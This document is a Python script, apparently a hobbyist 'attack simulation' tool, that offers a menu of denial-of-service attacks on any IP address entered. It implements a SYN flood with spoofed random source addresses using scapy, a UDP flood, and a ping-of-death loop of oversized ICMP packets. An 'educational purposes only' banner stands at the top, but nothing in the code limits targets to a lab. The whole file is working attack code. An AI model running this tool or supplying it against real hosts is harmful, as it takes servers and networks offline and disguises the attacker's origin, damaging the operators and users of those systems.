import os
import sys
import time
import socket
import random
from scapy.all import IP, TCP, ICMP, send

# ANSI Colors for Hacker Theme
GREEN  = "\033[92m"
RED    = "\033[91m"
CYAN   = "\033[96m"
YELLOW = "\033[93m"
BOLD   = "\033[1m"
RESET  = "\033[0m"

def print_warning():
    """Display a warning message before starting."""
    os.system("clear")
    warning_message = f"""
{RED}{BOLD}
##############################################################################
#  WARNING: THIS TOOL IS FOR EDUCATIONAL PURPOSES ONLY!                      #
#  THE AUTHOR IS NOT RESPONSIBLE FOR ANY MISUSE OR ILLEGAL ACTIVITIES.       #
#  USE THIS TOOL ONLY IN A CONTROLLED AND AUTHORIZED ENVIRONMENT.            #
##############################################################################
{RESET}
"""
    print(warning_message)
    time.sleep(3)

def print_hacker_banner():
    """Display hacker-style banner and website info only once."""
    os.system("clear")
    banner = f"""
{GREEN}{BOLD}
  ▄████  ██░ ██  ▄▄▄       ██▓     ██▓     ▒█████   ██▀███  
 ██▒ ▀█▒▓██░ ██▒▒████▄    ▓██▒    ▓██▒    ▒██▒  ██▒▓██ ▒ ██▒
▒██░▄▄▄░▒██▀▀██░▒██  ▀█▄  ▒██░    ▒██░    ▒██░  ██▒▓██ ░▄█ ▒
░▓█  ██▓░▓█ ░██ ░██▄▄▄▄██ ▒██░    ▒██░    ▒██   ██░▒██▀▀█▄  
░▒▓███▀▒░▓█▒░██▓ ▓█   ▓██▒░██████▒░██████▒░ ████▓▒░░██▓ ▒██▒
 ░▒   ▒  ▒ ░░▒░▒ ▒▒   ▓▒█░░ ▒░▓  ░░ ▒░▓  ░░ ▒░▒░▒░ ░ ▒▓ ░▒▓░
  ░   ░  ▒ ░▒░ ░  ▒   ▒▒ ░░ ░ ▒  ░░ ░ ▒  ░  ░ ▒ ▒░   ░▒ ░ ▒░
░ ░   ░  ░  ░░ ░  ░   ▒     ░ ░     ░ ░   ░ ░ ░ ▒    ░░   ░ 
      ░  ░  ░  ░      ░  ░    ░  ░    ░  ░    ░ ░     ░     
               {CYAN}Welcome to the Cyber Attack Simulation Tool{RESET}
"""
    print(banner)
    print(f"{YELLOW}Created by: Sujal Lamichhane | Cyber Security Enthusiast{RESET}")
    print(f"{CYAN}Website: sujallamichhane.com.np{RESET}")
    print(f"{CYAN}[INFO] Visit: sujallamichhane.com.np for more cybersecurity insights!{RESET}\n")
    time.sleep(1)

def check_root():
    """Ensure the script is run as root."""
    if os.geteuid() != 0:
        print(f"{RED}[!] This script must be run as root (sudo). Exiting...{RESET}")
        sys.exit(1)

def server_status(target_ip):
    """Check if the target server is up by attempting a connection on port 80."""
    try:
        socket.create_connection((target_ip, 80), timeout=2)
        print(f"{GREEN}[+] Server {target_ip} is UP!{RESET}")
        return True
    except Exception as e:
        print(f"{RED}[-] Server {target_ip} is DOWN! Error: {e}{RESET}")
        return False

def syn_flood(target_ip, target_port, duration):
    """Perform a TCP SYN Flood Attack."""
    print(f"{YELLOW}[+] Starting TCP SYN Flood Attack on {target_ip}:{target_port}{RESET}")
    timeout = time.time() + duration
    packet_count = 0
    while time.time() < timeout:
        try:
            # Generate a random source IP
            src_ip = ".".join(map(str, (random.randint(1, 255) for _ in range(4))))
            packet = IP(src=src_ip, dst=target_ip) / TCP(sport=random.randint(1024, 65535),
                                                          dport=target_port, flags="S")
            send(packet, verbose=False)
            packet_count += 1
            print(f"{CYAN}[PACKETS SENT: {packet_count}]{RESET}", end="\r")
        except Exception as e:
            print(f"\n{RED}[ERROR] Issue with sending SYN packets: {e}{RESET}")
            break
    print(f"\n{GREEN}[+] SYN Flood Attack Completed. Packets Sent: {packet_count}{RESET}")

def udp_flood(target_ip, target_port, duration):
    """Perform a UDP Flood Attack."""
    print(f"{YELLOW}[+] Starting UDP Flood Attack on {target_ip}:{target_port}{RESET}")
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        packet = random._urandom(1024)
    except Exception as e:
        print(f"{RED}[ERROR] Could not create UDP socket: {e}{RESET}")
        return
    timeout = time.time() + duration
    packet_count = 0
    while time.time() < timeout:
        try:
            sock.sendto(packet, (target_ip, target_port))
            packet_count += 1
            print(f"{CYAN}[PACKETS SENT: {packet_count}]{RESET}", end="\r")
        except Exception as e:
            print(f"\n{RED}[ERROR] Issue with sending UDP packets: {e}{RESET}")
            break
    print(f"\n{GREEN}[+] UDP Flood Attack Completed. Packets Sent: {packet_count}{RESET}")

def ping_of_death(target_ip, duration):
    """Perform a Ping of Death Attack."""
    print(f"{YELLOW}[+] Starting Ping of Death Attack on {target_ip}{RESET}")
    timeout = time.time() + duration
    packet_count = 0
    while time.time() < timeout:
        try:
            packet = IP(dst=target_ip) / ICMP() / (b"X" * 65500)
            send(packet, verbose=False)
            packet_count += 1
            print(f"{CYAN}[PACKETS SENT: {packet_count}]{RESET}", end="\r")
        except Exception as e:
            print(f"\n{RED}[ERROR] Issue with sending Ping of Death packets: {e}{RESET}")
            break
    print(f"\n{GREEN}[+] Ping of Death Attack Completed. Packets Sent: {packet_count}{RESET}")

def main():
    print_hacker_banner()
    check_root()
    
    while True:
        print(f"{BOLD}{YELLOW}\nSelect Attack Type:{RESET}")
        print("1: TCP SYN Flood")
        print("2: UDP Flood")
        print("3: Ping of Death")
        print("4: Exit")
        try:
            choice = int(input(f"{CYAN}Enter your choice (1-4): {RESET}"))
        except ValueError:
            print(f"{RED}[ERROR] Invalid input. Please enter a number between 1 and 4.{RESET}")
            continue
        
        if choice == 4:
            print(f"{GREEN}Exiting...{RESET}")
            sys.exit(0)
        
        target_ip = input(f"{CYAN}Enter Target IP: {RESET}").strip()
        if choice in [1, 2]:
            try:
                target_port = int(input(f"{CYAN}Enter Target Port: {RESET}").strip())
            except ValueError:
                print(f"{RED}[ERROR] Invalid port number.{RESET}")
                continue
        else:
            target_port = None
        try:
            duration = int(input(f"{CYAN}Enter Duration (seconds): {RESET}").strip())
        except ValueError:
            print(f"{RED}[ERROR] Invalid duration.{RESET}")
            continue
        
        if not server_status(target_ip):
            print(f"{RED}[ERROR] Target server seems down. Check the IP or try again later.{RESET}")
            continue
        
        if choice == 1:
            syn_flood(target_ip, target_port, duration)
        elif choice == 2:
            udp_flood(target_ip, target_port, duration)
        elif choice == 3:
            ping_of_death(target_ip, duration)
        else:
            print(f"{RED}[ERROR] Invalid option selected.{RESET}")

if __name__ == "__main__":
    print_warning()
    main()
